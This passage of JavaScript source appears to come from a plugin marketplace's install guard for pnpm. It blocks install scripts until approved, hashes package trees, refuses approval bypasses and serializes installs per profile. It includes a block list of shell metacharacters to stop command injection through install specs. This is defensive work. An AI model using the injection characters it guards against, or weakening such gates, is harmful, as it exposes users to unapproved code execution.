 * then re-asked about, say, `node-pty` pulled in months ago by a different
 * plugin, with the disclosure card correctly but uselessly reporting it as "a
 * transitive dependency — NOT the package you asked for".
 *
 * That is worse than noise. An approval prompt that fires on every install for
 * a package the user never chose is the fastest way to train people to approve
 * without reading, which is the entire value of the gate.
 *
 * So preserve exactly the approvals that cannot cover anything new: a package
 * already on disk, still at the version it was approved at. Bare-name keys are
 * pinned to the installed version on the way in (`node-pty` →
 * `node-pty@1.1.0`), so the same transaction pulling a DIFFERENT version of an
 * approved package still meets a closed gate. Anything whose installed version
 * cannot be established is dropped — fail closed, the user is asked again.
 *
 * @param content - current pnpm-workspace.yaml contents.
 * @param resolveInstalledVersion - `(name) => version | undefined` for what is
 *   on disk right now; omitted (tests, callers without a profile) drops every
 *   approval, which is the old all-or-nothing behaviour.
 * @returns the neutralized workspace yaml.
 */
export function neutralizeWorkspaceContent(content, resolveInstalledVersion) {
  const source = typeof content === "string" ? content : DEFAULT_WORKSPACE_YAML;
  let parsed;
  try {
    parsed = load(source);
  } catch (error) {
    throw new Error(`pnpm-workspace.yaml does not parse, refusing to run an install: ${error.message}`);
  }
  if (parsed === null || parsed === undefined) parsed = {};
  if (typeof parsed !== "object" || Array.isArray(parsed)) {
    throw new Error("pnpm-workspace.yaml root must be a mapping");
  }
  parsed.allowBuilds = preserveInstalledApprovals(parsed.allowBuilds, resolveInstalledVersion);
  parsed.onlyBuiltDependencies = [];
  parsed.dangerouslyAllowAllBuilds = false;
  return dump(parsed, { lineWidth: -1, noRefs: true, sortKeys: false });
}

/**
 * The subset of `current` that provably cannot authorize anything new, keyed by
 * the selector pnpm will match. See {@link neutralizeWorkspaceContent}.
 */
function preserveInstalledApprovals(current, resolveInstalledVersion) {
  if (typeof resolveInstalledVersion !== "function") return {};
  const approvedKeys = Array.isArray(current)
    ? current.map((entry) => String(entry))
    : current !== null && typeof current === "object"
      ? Object.entries(current).filter(([, value]) => value === true).map(([key]) => key)
      : [];
  const preserved = {};
  for (const key of approvedKeys) {
    const parsedKey = splitBuildSelector(key);
    if (parsedKey === undefined) continue;
    let installed;
    try {
      installed = resolveInstalledVersion(parsedKey.name);
    } catch {
      continue; // 读不出来就当没批准过——失败方向朝「再问一次」
    }
    if (typeof installed !== "string" || installed.length === 0) continue;
    if (parsedKey.spec === undefined) {
      // 裸名：钉到当前已装版本，别让同一次事务换上来的新版本蹭到。
      preserved[`${parsedKey.name}@${installed}`] = true;
    } else if (parsedKey.spec === installed) {
      preserved[key] = true;
    }
    // 非 registry 的 selector（file:/link:/github:）对不上已装版本号，
    // 无法证明它只覆盖眼下这一份，一律丢弃重问。
  }
  return preserved;
}

/** Enable exactly the selectors pnpm itself reported while every broad build
 * policy switch stays disabled. The caller restores these temporary bytes as
 * soon as the rebuild process closes. */
export function enableApprovedBuildSelectors(content, selectors) {
  const parsed = load(neutralizeWorkspaceContent(content));
  const allowBuilds = {};
  for (const raw of Array.isArray(selectors) ? selectors : []) {
    const selector = String(raw ?? "");
    if (selector.length === 0 || selector.length > 512 || /[\u0000-\u001f\u007f]/.test(selector)) {
      throw new Error(`invalid pnpm build selector ${JSON.stringify(raw)}`);
    }
    allowBuilds[selector] = true;
  }
  if (Object.keys(allowBuilds).length === 0) throw new Error("no build selectors were approved");
  parsed.allowBuilds = allowBuilds;
  return dump(parsed, { lineWidth: -1, noRefs: true, sortKeys: false });
}

/** Legacy package.json policy may authorize scripts before the workspace gate
 * sees them. Refuse it: restoring the whole manifest after a successful add
 * would also erase the newly installed dependency. */
export function assertNoManifestBuildBypass(profileDir) {
  const manifest = JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8"));
  const pnpm = manifest?.pnpm;
  if (pnpm && typeof pnpm === "object") {
    if (pnpm.dangerouslyAllowAllBuilds === true) throw new Error("package.json pnpm.dangerouslyAllowAllBuilds=true would bypass install-script approval");
    if (Array.isArray(pnpm.onlyBuiltDependencies) && pnpm.onlyBuiltDependencies.length > 0) throw new Error("package.json pnpm.onlyBuiltDependencies pre-authorizes install scripts");
    if (pnpm.allowBuilds && typeof pnpm.allowBuilds === "object" && Object.values(pnpm.allowBuilds).some((value) => value === true)) {
      throw new Error("package.json pnpm.allowBuilds pre-authorizes install scripts");
    }
  }
  const dependenciesMeta = manifest?.dependenciesMeta;
  if (dependenciesMeta && typeof dependenciesMeta === "object") {
    for (const [selector, metadata] of Object.entries(dependenciesMeta)) {
      if (metadata?.built === true) throw new Error(`package.json dependenciesMeta.${selector}.built=true would bypass install-script approval`);
    }
  }
}

/**
 * Deterministically hash the normalized package tree of a materialized package.
 * Computes SHA-256 over relative POSIX file paths and raw file bytes.
 * Rejects symlink escapes pointing outside the package directory.
 * @param pkgDir - absolute path to the materialized package directory.
 * @returns SHA-256 hex string.
 */
export function hashPackageTree(pkgDir) {
  if (typeof pkgDir !== "string" || !existsSync(pkgDir)) {
    throw new Error(`cannot hash package tree: directory ${JSON.stringify(pkgDir)} does not exist`);
  }
  const realRoot = realpathSync(pkgDir);
  const hash = createHash("sha256");
  const files = [];
  const visitedDirectories = new Set();

  function walk(currentDir) {
    const currentReal = realpathSync(currentDir);
    if (visitedDirectories.has(currentReal)) {
      throw new Error(`symlink cycle detected in package tree at ${currentDir}`);
    }
    visitedDirectories.add(currentReal);
    let entries;
    try {
      entries = readdirSync(currentDir, { withFileTypes: true });
    } catch (err) {
      throw new Error(`cannot read directory ${currentDir}: ${err.message}`);
    }
    entries.sort((a, b) => a.name.localeCompare(b.name));
    for (const entry of entries) {
      const entryName = entry.name;
      // npm excludes .git metadata from packed artifacts. Package-local
      // node_modules is NOT skipped: bundledDependencies are executable bytes
      // belonging to the artifact and must be covered by the approval proof.
      if (entryName === ".git") continue;

      const fullPath = join(currentDir, entryName);
      let lstat;
      try {
        lstat = lstatSync(fullPath);
      } catch (err) {
        throw new Error(`cannot stat ${fullPath}: ${err.message}`);
      }

      if (lstat.isSymbolicLink()) {
        let targetReal;
        try {
          targetReal = realpathSync(fullPath);
        } catch (err) {
          throw new Error(`unresolvable symlink ${fullPath}: ${err.message}`);
        }
        const rel = relative(realRoot, targetReal);
        if (rel === ".." || rel.startsWith(`..${sep}`) || isAbsolute(rel)) {
          throw new Error(`symlink escape detected in package tree: ${fullPath} points outside package root to ${targetReal}`);
        }
        let targetStat;
        try {
          targetStat = statSync(targetReal);
        } catch (err) {
          throw new Error(`cannot stat symlink target ${targetReal}: ${err.message}`);
        }
        const relPath = relative(realRoot, fullPath).replace(/\\/g, "/");
        const linkTarget = readlinkSync(fullPath).replace(/\\/g, "/");
        hash.update(`link:${relPath}\0${linkTarget}\0${lstat.mode & 0o777}\0`);
        if (targetStat.isDirectory()) {
          walk(fullPath);
        } else if (targetStat.isFile()) {
          files.push({ relPath, fullPath: targetReal, mode: targetStat.mode & 0o777 });
        }
      } else if (lstat.isDirectory()) {
        walk(fullPath);
      } else if (lstat.isFile()) {
        const relPath = relative(realRoot, fullPath).replace(/\\/g, "/");
        files.push({ relPath, fullPath, mode: lstat.mode & 0o777 });
      }
    }
    visitedDirectories.delete(currentReal);
  }

  walk(realRoot);
  files.sort((a, b) => a.relPath.localeCompare(b.relPath));

  for (const { relPath, fullPath, mode } of files) {
    let content;
    try {
      content = readFileSync(fullPath);
    } catch (err) {
      throw new Error(`cannot read file ${fullPath} during package hashing: ${err.message}`);
    }
    hash.update(`file:${relPath}\0${mode}\0${content.length}\0`);
    hash.update(content);
  }

  return hash.digest("hex");
}

/**
 * Locate a materialized package under <profileDir>/node_modules or .pnpm virtual store.
 * Strictly never falls back to ancestor node resolution.
 * @param profileDir - target profile directory.
 * @param pkgName - npm package name.
 * @param version - optional specific version.
 * @returns {{ dir: string, manifest: object }}
 */
export function findMaterializedPackage(profileDir, pkgName, version) {
  if (typeof pkgName !== "string" || !NPM_NAME_RE.test(pkgName)) {
    throw new Error(`invalid package name ${JSON.stringify(pkgName)} for materialized resolution`);
  }
  const modulesRoot = resolve(profileDir, "node_modules");

  // 1. Direct candidate path in profileDir/node_modules
  const direct = resolve(modulesRoot, ...pkgName.split("/"));
  const directManifestPath = join(direct, "package.json");
  if (existsSync(directManifestPath)) {
    try {
      const manifest = JSON.parse(readFileSync(directManifestPath, "utf8"));
      if (manifest && typeof manifest === "object" && manifest.name === pkgName) {
        if (!version || manifest.version === version) {
          const realDir = realpathSync(direct);
          return { dir: realDir, manifest };
        }
      }
    } catch {
      /* fallback to .pnpm */
    }
  }

  // 2. Search in node_modules/.pnpm virtual store
  const pnpmDir = join(modulesRoot, ".pnpm");
  const matches = [];
  if (existsSync(pnpmDir)) {
    try {
      const entries = readdirSync(pnpmDir, { withFileTypes: true });
      for (const entry of entries) {
        if (!entry.isDirectory()) continue;
        const candidatePath = join(pnpmDir, entry.name, "node_modules", ...pkgName.split("/"));
        const mPath = join(candidatePath, "package.json");
        if (existsSync(mPath)) {
          try {
            const manifest = JSON.parse(readFileSync(mPath, "utf8"));
            if (manifest && typeof manifest === "object" && manifest.name === pkgName) {
              if (!version || manifest.version === version) {
                matches.push({ dir: realpathSync(candidatePath), manifest });
              }
            }
          } catch {}
        }
      }
    } catch {}
  }

  const uniqueMatches = [];
  const seenPaths = new Set();
  for (const match of matches) {
    if (!seenPaths.has(match.dir)) {
      seenPaths.add(match.dir);
      uniqueMatches.push(match);
    }
  }

  if (uniqueMatches.length === 1) {
    return uniqueMatches[0];
  }
  if (uniqueMatches.length > 1) {
    throw new Error(`ambiguous materialized package resolution for ${pkgName}${version ? `@${version}` : ""}: multiple distinct copies found in .pnpm`);
  }

  throw new Error(`cannot locate materialized package directory for ${pkgName}${version ? `@${version}` : ""} in ${profileDir}`);
}

/** Extract sorted lifecycle script commands (preinstall, install, postinstall) from manifest. */
export function extractLifecycleScripts(manifest) {
  const scripts = {};
  const raw = manifest?.scripts;
  if (raw && typeof raw === "object") {
    for (const key of ["preinstall", "install", "postinstall"]) {
      if (typeof raw[key] === "string" && raw[key].trim().length > 0) {
        scripts[key] = raw[key];
      }
    }
  }
  return scripts;
}

/** Resolve direct candidate package name from profile state, spec, or preflight. */
export function resolveCandidateName(profileDir, spec, beforeDeps = new Set(), preflight) {
  if (preflight?.candidate?.name && typeof preflight.candidate.name === "string") {
    return preflight.candidate.name;
  }
  const manifestPath = join(profileDir, "package.json");
  if (existsSync(manifestPath)) {
    try {
      const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
      const newDeps = Object.keys(manifest.dependencies ?? {}).filter((d) => !beforeDeps.has(d));
      if (newDeps.length === 1) return newDeps[0];
    } catch {}
  }
  if (typeof spec === "string") {
    const raw = spec.trim();
    if (/^(?:file:|link:)/i.test(raw)) {
      const localDir = resolve(profileDir, raw.replace(/^(?:file:|link:)/i, "").replace(/[\\/]+$/, ""));
      const localPkg = join(localDir, "package.json");
      if (existsSync(localPkg)) {
        try {
          const m = JSON.parse(readFileSync(localPkg, "utf8"));
          if (m?.name) return m.name;
        } catch {}
      }
    }
    const name = npmNameOf(raw);
    if (name) return name;
  }
  const modulesRoot = join(profileDir, "node_modules");
  if (existsSync(modulesRoot)) {
    try {
      const entries = readdirSync(modulesRoot, { withFileTypes: true });
      for (const entry of entries) {
        if (entry.name === ".pnpm" || entry.name.startsWith(".")) continue;
        if (entry.name.startsWith("@")) {
          const scopeEntries = readdirSync(join(modulesRoot, entry.name), { withFileTypes: true });
          for (const se of scopeEntries) {
            const fullName = `${entry.name}/${se.name}`;
            if (!beforeDeps.has(fullName)) return fullName;
          }
        } else if (!beforeDeps.has(entry.name)) {
          return entry.name;
        }
      }
    } catch {}
  }
  return undefined;
}

/**
 * Compute the canonical artifact proof from the materialized package tree.
 * Includes direct candidate identity (and content hash) even when its own
 * scripts are not blocked, plus every blocked package with resolved name, version,
 * sorted lifecycle scripts, and content hash.
 * @param profileDir - target profile directory.
 * @param candidateName - candidate package name.
 * @param ignoredList - array of {name, version} or string names blocked by pnpm.
 * @returns canonical proof object.
 */
export function computeMaterializedProof(profileDir, candidateName, ignoredList = []) {
  if (!candidateName) {
    throw new Error("cannot compute materialized proof: candidate package name is missing or unresolved");
  }
  const candidatePkg = findMaterializedPackage(profileDir, candidateName);
  const candidateScripts = extractLifecycleScripts(candidatePkg.manifest);
  const candidateHash = hashPackageTree(candidatePkg.dir);
  const candidateProof = {
    name: candidatePkg.manifest.name ?? candidateName,
    version: candidatePkg.manifest.version ?? "unknown",
    scripts: candidateScripts,
    contentHash: candidateHash,
  };

  const blockedPackages = [];
  const seen = new Set();
  for (const entry of ignoredList) {
    const pkgName = typeof entry === "string" ? entry.trim() : entry?.name?.trim();
    const selector = typeof entry === "object" && typeof entry?.selector === "string" ? entry.selector : pkgName;
    if (!pkgName || !selector || seen.has(selector)) continue;
    seen.add(selector);
    const version = typeof entry === "object" ? entry.version : undefined;
    const pkg = findMaterializedPackage(profileDir, pkgName, version);
    const scripts = extractLifecycleScripts(pkg.manifest);
    const contentHash = hashPackageTree(pkg.dir);
    blockedPackages.push({
      name: pkg.manifest.name ?? pkgName,
      version: pkg.manifest.version ?? "unknown",
      selector,
      direct: pkgName === candidateName,
      scripts,
      contentHash,
    });
  }

  blockedPackages.sort((a, b) => a.name.localeCompare(b.name) || a.version.localeCompare(b.version) || a.selector.localeCompare(b.selector));

  return {
    candidate: candidateProof,
    blockedPackages,
  };
}

/** Deterministically serialize a canonical proof object into canonical JSON. */
export function serializeCanonicalProof(proof) {
  if (!proof || typeof proof !== "object") return "";
  const normalizeScripts = (scripts) => {
    const out = {};
    if (scripts && typeof scripts === "object") {
      for (const key of ["preinstall", "install", "postinstall"]) {
        if (typeof scripts[key] === "string") out[key] = scripts[key];
      }
    }
    return out;
  };
  const normalizePkg = (pkg) => ({
    name: String(pkg?.name ?? ""),
    version: String(pkg?.version ?? ""),
    selector: String(pkg?.selector ?? pkg?.name ?? ""),
    direct: Boolean(pkg?.direct),
    scripts: normalizeScripts(pkg?.scripts),
    contentHash: String(pkg?.contentHash ?? ""),
  });
  const canonicalObj = {
    candidate: {
      name: String(proof.candidate?.name ?? ""),
      version: String(proof.candidate?.version ?? ""),
      scripts: normalizeScripts(proof.candidate?.scripts),
      contentHash: String(proof.candidate?.contentHash ?? ""),
    },
    blockedPackages: Array.isArray(proof.blockedPackages)
      ? proof.blockedPackages.map(normalizePkg).sort((a, b) => a.name.localeCompare(b.name) || a.version.localeCompare(b.version) || a.selector.localeCompare(b.selector))
      : [],
  };
  return JSON.stringify(canonicalObj);
}

/** Merge optional registry reputation facts with authoritative bytes read from
 * the materialized package. Security fields always come from the proof. */
export function disclosureFromMaterializedProof(proof, hints = []) {
  const hintList = Array.isArray(hints) ? hints : [];
  return (Array.isArray(proof?.blockedPackages) ? proof.blockedPackages : []).map((actual) => {
    const hint = hintList.find((entry) => entry?.name === actual.name && (entry?.version === undefined || entry.version === actual.version)) ?? {};
    return {
      weeklyDownloads: hint.weeklyDownloads,
      provenance: hint.provenance,
      unpackedSize: hint.unpackedSize,
      name: actual.name,
      version: actual.version,
      selector: actual.selector,
      direct: actual.direct,
      scripts: actual.scripts,
      contentHash: actual.contentHash,
    };
  });
}

/** Default pnpm-workspace.yaml for a profile that has none yet. */
const DEFAULT_WORKSPACE_YAML = "packages:\n  - .\n\nnodeLinker: hoisted\n";

/**
 * Apply mergeAllowBuilds to the profile's pnpm-workspace.yaml through the
 * guarded writer.
 * @returns a rollback function, or undefined when nothing needed changing.
 */
function ensureAllowBuilds(profileDir, names) {
  const workspacePath = join(profileDir, "pnpm-workspace.yaml");
  const content = existsSync(workspacePath) ? readFileSync(workspacePath, "utf8") : DEFAULT_WORKSPACE_YAML;
  const next = mergeAllowBuilds(content, names);
  if (next === undefined) return undefined;
  return writeYamlChecked(workspacePath, next, "pnpm-workspace.yaml");
}

// ── in-process install tracker (browser RPC surface) ────────────────────────
//
// The web host plane has no job controller (dsh-tool-jobs mounts per agent
// session), so ctx.jobs refuses background installs started outside an agent
// turn. The /market RPC channel therefore tracks its own installs in-process:
// same producer shape as the jobs registry ({cancel, done, readOutput}), just
// an independent registry.

let trackerCounter = 0;

/**
 * Create a tracker for browser-started install/uninstall jobs (see runInstall
 * and runRemove). Same producer shape as the jobs registry ({cancel, done,
 * readOutput}), just an independent registry.
 */
export function createJobTracker() {
  const records = new Map();
  const prune = () => {
    const now = Date.now();
    for (const [id, record] of records) {
      const terminal = record.status !== "running";
      if (terminal && record.finishedAt !== undefined && now - record.finishedAt > 3600000) records.delete(id);
    }
    if (records.size > 20) {
      const ordered = [...records.entries()].sort((a, b) => a[1].startedAt - b[1].startedAt);
      for (const [id, record] of ordered) {
        if (records.size <= 20) break;
        if (record.status !== "running") records.delete(id);
      }
    }
  };
  return {
    start({ profile, spec, verb = "add", allowBuildScripts, approvedProof, preflight, onSettled }) {
      const id = `market-${++trackerCounter}`;
      const kind = verb === "remove" ? "dsh-plugin-uninstall" : "dsh-plugin-install";
      const producer = verb === "remove" ? runRemove({ profile, packageName: spec }) : runInstall({ profile, spec, allowBuildScripts, approvedProof, preflight });
      const record = {
        id,
        kind,
        label: `dsh plugin --profile ${profile} ${verb} ${spec}`,
        profile,
        spec,
        status: "running",
        detail: undefined,
        startedAt: Date.now(),
        finishedAt: undefined,
        producer,
      };
      producer.done.then((outcome) => {
        record.status = outcome.status ?? "failed";
        record.detail = outcome.detail;
        // 待批准的构建脚本清单：浏览器侧据此渲染「允许并继续」，没有它就只有
        // 一段文本，用户看不出要批准的到底是什么。
        record.needsApproval = outcome.needsApproval;
        // 这次失败的原因活不过一次重启（见 failedNow），浏览器据此在重启后
        // 撤掉记录，而不是把一段现在时的描述当成当前状态留在面板上。
        record.staleOnRestart = outcome.staleOnRestart === true;
        record.finishedAt = Date.now();
        onSettled?.(outcome);
      });
      records.set(id, record);
      prune();
      return id;
    },
    get(jobId) {
      const record = records.get(String(jobId));
      if (record === undefined) throw new Error(`unknown install job ${JSON.stringify(String(jobId))}`);
      return {
        snapshot: {
          id: record.id,
          kind: record.kind,
          label: record.label,
          status: record.status,
          detail: record.detail,
          needsApproval: record.needsApproval,
          staleOnRestart: record.staleOnRestart,
          spec: record.spec,
          startedAt: record.startedAt,
          finishedAt: record.finishedAt,
        },
        output: record.producer.readOutput(),
      };
    },
    cancel(jobId) {
      const record = records.get(String(jobId));
      if (record === undefined) throw new Error(`unknown install job ${JSON.stringify(String(jobId))}`);
      record.producer.cancel();
      return "requested";
    },
  };
}

// ── spec shape guard ────────────────────────────────────────────────────────

// Windows spawn 走 shell，spec 会被拼进 cmd 行；agent 传入的参数不可信。
// 合法的 npm 名 / github:owner\/repo / git·file·link·URL spec 都不含这些
// shell 元字符——出现即拒绝，宁可误杀不放开命令注入面。`%` 在列：cmd 会
// 做 `%VAR%` 环境变量展开，展开结果常含分号/空格，足以改变参数切分。
// （cli.js 的同款黑名单一直含 %，此前三处已经漂移。）
const UNSAFE_SPEC_RE = /[;&|`$()<>^%!"*\n\r]/;

/** Reject install/remove specs carrying shell metacharacters. */
export function assertSafeSpec(spec) {
  const value = String(spec ?? "");
  if (UNSAFE_SPEC_RE.test(value)) {
    throw new Error(`spec contains characters that are not allowed in an install spec: ${JSON.stringify(value)}`);
  }
  // Windows 下 pnpm 走 shell，而 Node 只是把参数用空格 join 后交给 cmd，
  // 不逐参加引号——带空格的本地路径会被拆成两个参数，pnpm 报一个和路径
  // 毫无关系的错。用户也没法自己加引号绕过：`"` 就在上面的黑名单里。
  // 与其让它以看不懂的方式失败，不如在这里说清楚。
  if (process.platform === "win32" && /^(?:file:|link:)/i.test(value) && /\s/.test(value)) {
    throw new Error(`local path specs cannot contain spaces on Windows — pnpm is spawned through cmd, which would split the path into two arguments: ${JSON.stringify(value)}`);
  }
}

// ── pnpm self-heal (corepack) ───────────────────────────────────────────────

/**
 * Try to provision pnpm once via `corepack enable pnpm` (corepack ships with
 * Node). Output lands in the caller's job log; returns whether a retry of the
 * pnpm spawn is worth attempting.
 *
 * `onProc` hands the child to the caller so job_kill can reach it. Without it
 * this was a hole in cancellation: `current` still pointed at the pnpm spawn
 * that had just failed with ENOENT, so cancel() killed nothing while corepack
 * ran on, and the caller then started a full install anyway.
 */
async function enablePnpmViaCorepack(push, onProc) {
  push("\n[dsh-plugin-mall] pnpm not found on PATH — trying `corepack enable pnpm` once\n");
  return await new Promise((resolve) => {
    let proc;
    try {
      proc = spawn("corepack", ["enable", "pnpm"], {
        env: process.env,
        shell: process.platform === "win32",
        stdio: ["ignore", "pipe", "pipe"],
        windowsHide: true,
      });
    } catch {
      resolve(false);
      return;
    }
    // shell:true on Windows means the real corepack is a grandchild of cmd.exe,
    // so the same tree-kill rule as pnpm applies.
    onProc?.({ proc, treeKill: process.platform === "win32" });
    proc.on("error", () => resolve(false));
    proc.stdout?.on("data", (data) => push(data.toString()));
    proc.stderr?.on("data", (data) => push(data.toString()));
    proc.on("close", (code) => resolve(code === 0));
  });
}

// ── per-profile transaction serialization ───────────────────────────────────
//
// Install and remove mutate the same profile files (package.json, lockfile,
// workspace yaml, patch layer) and node_modules. Two pnpm processes running
// concurrently in one profile interleave those writes and can corrupt both
// transactions. Every producer — add AND remove — therefore runs through a
// per-profile in-process queue: a job starts only after the previous one
// reached a terminal state, and the lock is released on every outcome
// (completed/failed/killed) and on internal errors.

const profileQueues = new Map(); // lockKey -> Promise<void> tail

/** Lock key for a profile: the resolved dir when the name is valid. */
function profileLockKey(profile) {
  try {
    return resolveProfileDir(profile);
  } catch {
    return `invalid:${String(profile)}`;
  }
}

function enqueueProfileTask(lockKey, task) {
  const key = String(lockKey);
  const tail = profileQueues.get(key) ?? Promise.resolve();
  const run = tail.then(task, task);
  // The stored tail never rejects, so one poisoned task can never stall the
  // queue; it is dropped from the map once it is the latest settled tail.
  const stored = run.then(() => undefined, () => undefined);
  profileQueues.set(key, stored);
  void stored.then(() => {
    if (profileQueues.get(key) === stored) profileQueues.delete(key);
  });
  return run;
}

/**
 * Run a producer factory under the profile's queue. The returned producer
 * settles `done` with the inner producer's outcome; cancel() before the job
 * starts settles it as killed without ever spawning pnpm. `done` ALWAYS
 * resolves with an outcome object — never rejects — so callers (and the
 * queue itself) have exactly one settlement path.
 */
function serializedProducer(lockKey, start) {
  let inner;
  let cancelRequested = false;
  const done = enqueueProfileTask(lockKey, () => {
    if (cancelRequested) {
      return { status: "killed", detail: "cancelled while queued behind another profile transaction — pnpm never ran" };
    }
    try {
      inner = start();
    } catch (error) {
      return { status: "failed", detail: error?.message ?? String(error) };
    }
    return Promise.resolve(inner.done).then(
      (outcome) => outcome,
      (error) => ({ status: "failed", detail: `internal error: ${error?.message ?? String(error)}` }),
    );
  });
  return {
    cancel: () => {
      cancelRequested = true;
      inner?.cancel();
    },
    done,
    readOutput: () => inner?.readOutput() ?? "",
  };
}

// ── pnpm spawn plan (Windows cancel correctness) ────────────────────────────
//
// Killing a shell-wrapped process kills the WRAPPER, not pnpm: on Windows
// `shell: true` spawns `cmd /d /s /c pnpm ...`, and proc.kill() terminates
// cmd.exe while the real pnpm (a grandchild) keeps running — and keeps
// mutating the profile while rollback restores it. So: spawn pnpm without a
// shell wherever the platform allows it, and when Windows forces a wrapper
// (a .cmd shim cannot be spawned with shell:false on modern Node), cancel
// terminates the whole process tree and the done chain waits for the
// wrapper's 'close' before any rollback runs.
//
// The plan itself is pnpmSpawnPlan in guard.js (imported above) — one
// implementation, not a local mirror. It quotes the .cmd path: Node's
// shell:true joins without per-argument quoting, and `D:\Program Files\…`
// would be cut at the first space (`'D:\Program' is not recognized`).

/**
 * Terminate a shell-wrapped process tree (Windows): taskkill /T /F kills the
 * wrapper AND its descendants, synchronously, so cancel() returns only after
 * the tree is signalled; the wrapper's 'close' then resolves the done chain
 * and rollback runs strictly after every pnpm process has exited.
 */
function killProcessTree(proc) {
  if (process.platform !== "win32" || typeof proc?.pid !== "number") {
    try { proc?.kill(); } catch { /* already gone */ }
    return;
  }
  try {
    spawnSync("taskkill", ["/pid", String(proc.pid), "/T", "/F"], { stdio: "ignore", windowsHide: true, timeout: 10000 });
  } catch { /* taskkill missing — fall through to a plain kill */ }
  try { proc.kill(); } catch { /* already gone */ }
}

/** Kill the in-flight pnpm spawn, tree-killing when it runs in a shell wrapper. */
function cancelSpawned(current) {
  if (current === undefined || current === null) return;
  if (current.treeKill === true) killProcessTree(current.proc);
  else {
    try { current.proc.kill(); } catch { /* already exited */ }
  }
}

/**
 * Did this pnpm run end because WE cancelled it?
 *
 * `exitCode === null` was the sole test, and it is a POSIX-only tell: it holds
 * when Node itself signals a directly-spawned child, which is what every
 * fixture here does (FakeProc emits close(null, "SIGTERM")). The real Windows
 * path never produces it. pnpm is a .cmd shim, so it must be spawned through a
 * shell wrapper, and cancelling means killProcessTree → `taskkill /T /F`; the
 * wrapper is then TERMINATED rather than signalled, and Node reports
 * `close(1, null)` — measured, not assumed. So a user pressing job_kill during
 * `pnpm add` got:
 *
 *   failed, pnpm add <spec> failed (exit code 1). See job output.
 *
 * The model reading that concludes the plugin cannot be installed and starts
 * debugging a problem that does not exist — registry, network, the candidate
 * itself — when all that happened is the user cancelled. Rollback ran either
 * way (the outer handler rolls back anything that is neither `completed` nor
 * an approval pause), so this was purely a misreported ending — the same class
 * of bug as a cancelled preflight surfacing as a blocked verdict.
 *
 * Our own intent is the reliable signal, so it is checked first; the exitCode
 * test stays for a kill that arrives from outside this process.
 */
function endedByCancel(outcome, cancelRequested) {
  return cancelRequested === true || outcome.exitCode === null;
}

/**
 * How a cancelled run describes itself — exit codes are noise once cancelled.
 *
 * It says what happened to the PROCESS and stops there. What happened to the
 * profile is the rollback's verdict to give, and the rollback has not run yet
 * when this is called: promising "the profile was restored" here would print
 * that even when the rollback later fails, which is the one moment the user
 * must be told to go look. rollbackRemove() already models this correctly with
 * three distinct endings; the callers below append theirs the same way.
 */
function cancelDetail(outcome, cancelRequested) {
  if (cancelRequested === true) return "cancelled — pnpm was terminated";
  return outcome.signal ? `signal: ${outcome.signal}` : "killed before exit";
}

/** Mirrors guard.js pendingPath(): <home>/guard/pending-<profile>.json. */
function pendingMarkerPath(profileDir) {
  return join(dirname(dirname(profileDir)), "guard", `pending-${basename(profileDir)}.json`);
}

// ── the background install job ──────────────────────────────────────────────

/**
 * Run `pnpm add <spec>` in the profile directory as a job producer with the
 * shape `ctx.jobs.start` expects: `{ cancel, done: Promise<outcome>, readOutput: () => string }`.
 * A failure whose output lists ignored build scripts gets one automatic
 * retry after merging those names into `allowBuilds`.
 */
/**
 * Render "here is exactly what you would be approving". Deliberately avoids
 * any wording like "security check passed" — approving these scripts says
 * nothing about what the plugin does once it is loaded.
 */
function renderApprovalNeeded(spec, disclosure) {
  const lines = [
    `installing ${spec} requires running install-time code — approval needed.`,
    "No install script ran and no plugin code loaded. The candidate is staged",
    "with its scripts blocked, and the original profile snapshot is retained.",
    "On approval, the materialized bytes and commands must match this disclosure",
    "before the verified tree is rebuilt. If you do not approve, restart dsh or",
    "run `dsh-plugin-guard guard recover` to roll the paused transaction back.",
    "",
  ];
  for (const entry of disclosure) {
    const origin = entry.direct
      ? "the plugin itself"
      : "a transitive dependency — NOT the package you asked for";
    lines.push(`  ${entry.name}${entry.version ? `@${entry.version}` : ""}   (${origin})`);
    if (entry.selector) lines.push(`      pnpm selector: ${entry.selector}`);
    for (const [key, command] of Object.entries(entry.scripts ?? {})) lines.push(`      ${key}: ${command}`);
    if (entry.contentHash) lines.push(`      artifact SHA-256: ${entry.contentHash}`);
    const facts = [];
    if (typeof entry.weeklyDownloads === "number") facts.push(`${entry.weeklyDownloads.toLocaleString()} weekly downloads`);
    facts.push(entry.provenance === true ? "has provenance" : "no provenance");
    if (typeof entry.unpackedSize === "number") facts.push(`${Math.round(entry.unpackedSize / 104857.6) / 10} MB unpacked`);
    lines.push(`      ${facts.join(" · ")}`);
  }
  lines.push("");
  lines.push("These commands run on your machine, with your privileges, before any plugin code loads.");
  lines.push(`To proceed, install again with allowBuildScripts: [${disclosure.map((entry) => JSON.stringify(entry.name)).join(", ")}]`);
  return lines.join("\n");
}

/**
 * Args for the live `pnpm add`. Peer auto-install is disabled just like in the
 * disposable probe install (guard.js probeAddArgs): a marketplace install must
 * never pull the @deepseek-ai host peer stack into the profile. The spec is
 * validated by assertSafeSpec before this runs; every other argv entry is a
 * fixed string.
 *
 * strict-dep-builds forces pnpm to FAIL when it blocks a build script instead
 * of exiting 0 while printing "Ignored build scripts" — which used to bypass
 * the approval gate entirely and finalize a success with the scripts silently
 * skipped. The successful output is still inspected (see settle), so even a
 * pnpm that does not honor the flag cannot slip ignored builds past the gate.
 */
function liveAddArgs(spec) {
  return [
    "add",
    spec,
    "--reporter=append-only",
    "--config.auto-install-peers=false",
    "--config.strict-dep-builds=true",
    "--config.dangerously-allow-all-builds=false",
  ];
}

/** Rebuild only the already-materialized packages whose exact pnpm selectors
 * were approved. Unlike a second `pnpm add <spec>`, this never re-resolves a
 * mutable file/git/tag spec after the proof comparison. */
function rebuildApprovedArgs(packageNames) {
  const names = [...new Set(packageNames)].sort();
  if (names.length === 0 || names.some((name) => !NPM_NAME_RE.test(name))) {
    throw new Error("cannot rebuild an empty or invalid approved package set");
  }
  return ["rebuild", ...names, "--reporter=append-only"];
}

/**
 * Env for the live `pnpm add`. pnpmGuardEnv disables peer auto-install; the
 * strict-dep-builds pair is the env form of the --config flag above and also
 * reaches any pnpm the install itself spawns (git-hosted deps, nested runs).
 */
function liveAddEnv(base = process.env) {
  return {
    ...pnpmGuardEnv(base),
    npm_config_strict_dep_builds: "true",
    NPM_CONFIG_STRICT_DEP_BUILDS: "true",
    npm_config_dangerously_allow_all_builds: "false",
    NPM_CONFIG_DANGEROUSLY_ALLOW_ALL_BUILDS: "false",
  };
}

